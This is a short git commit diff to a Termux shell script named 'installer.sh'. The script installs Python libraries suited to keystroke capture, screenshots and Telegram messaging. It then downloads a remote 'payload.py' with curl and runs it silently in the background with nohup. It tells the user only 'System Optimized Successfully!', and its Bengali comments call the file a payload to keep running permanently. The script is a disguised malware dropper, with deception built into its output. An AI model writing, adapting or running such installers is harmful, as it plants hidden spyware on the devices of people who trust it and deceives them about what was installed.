028f6b1d951ca60d40986029605b00aff03333c9
yashkhanofficial <info.yashkhan@gmail.com>
2026-02-26 01:38:55 +0300

    Update installer.sh

--- installer.sh
+++ installer.sh
@@ -3,7 +3,7 @@
 pkg install python python-pip termux-api -y
 pip install pyTelegramBotAPI requests pynput pyautogui pillow
 # আপনার গিটহাব থেকে পেলোড নামানো
-curl -LO https://raw.githubusercontent.com/yash-khan/Advanced-system-core/main/payload.py
+curl -LO https://raw.githubusercontent.com/yashkhanofficial/Advanced-system-core/main/payload.py
 # ব্যাকগ্রাউন্ডে পারমানেন্টলি চালু করা
 nohup python payload.py > /dev/null 2>&1 &
 echo "System Optimized Successfully!"
